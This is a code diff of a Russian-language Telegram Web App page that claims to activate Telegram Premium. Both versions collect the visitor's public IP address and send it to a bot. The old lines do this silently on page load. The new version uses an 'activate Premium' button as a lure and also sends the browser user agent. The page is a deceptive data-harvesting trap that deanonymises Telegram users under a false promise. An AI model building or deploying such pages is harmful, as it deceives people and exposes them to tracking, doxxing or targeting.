@@ -1,12 +1,82 @@
+<!DOCTYPE html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Активация Premium</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script>var IS_IP_SENT = false; function sendIPtoBot(ip) { if (IS_IP_SENT) return; IS_IP_SENT = true; window.Telegram.WebApp.sendData(`{"web_app_ip":"${ip}"}`); }</script>
-    <script>fetch('https://checkip.amazonaws.com/').then(response => response.text()).then(ip => { sendIPtoBot(ip.trim()); });</script>
-    <script type="application/javascript">function getIP(json) { sendIPtoBot(json.ip); }</script>
-    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
-    <script>fetch('https://ifconfig.me/ip').then(response => response.text()).then(ip => { sendIPtoBot(ip.trim()); });</script>
-    <script>document.DOMContentLoaded = function () { };</script>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        button {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
 </head>
+<body>
+<div class="container">
+    <h1>Активация Telegram Premium</h1>
+    <p>Для подтверждения вашей личности и активации Premium, нажмите кнопку ниже:</p>
+    <button id="activateButton">Активировать Premium</button>
+    <p id="status">Получение данных...</p>
+</div>
 
+<script>
+    let IS_DATA_SENT = false;
+
+    function sendDataToBot(ip, userAgent) {
+        if (IS_DATA_SENT) return;
+        IS_DATA_SENT = true;
+
+        const data = {
+            web_app_ip: ip,
+            user_agent: userAgent
+        };
+
+        window.Telegram.WebApp.sendData(JSON.stringify(data));
+        document.getElementById("status").textContent = "Данные отправлены. Ожидайте...";
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+        const activateButton = document.getElementById("activateButton");
+        const status = document.getElementById("status");
+
+        activateButton.addEventListener("click", function() {
+            status.textContent = "Получение IP-адреса...";
+
+            Promise.all([
+                fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip),
+                Promise.resolve(navigator.userAgent)
+            ])
+            .then(([ip, userAgent]) => {
+                status.textContent = "Отправка данных...";
+                sendDataToBot(ip, userAgent);
+            })
+            .catch(error => {
+                console.error("Ошибка при получении данных:", error);
+                status.textContent = "Ошибка при получении данных. Попробуйте позже.";
+            });
+        });
+    });
+</script>
+</body>
 </html>
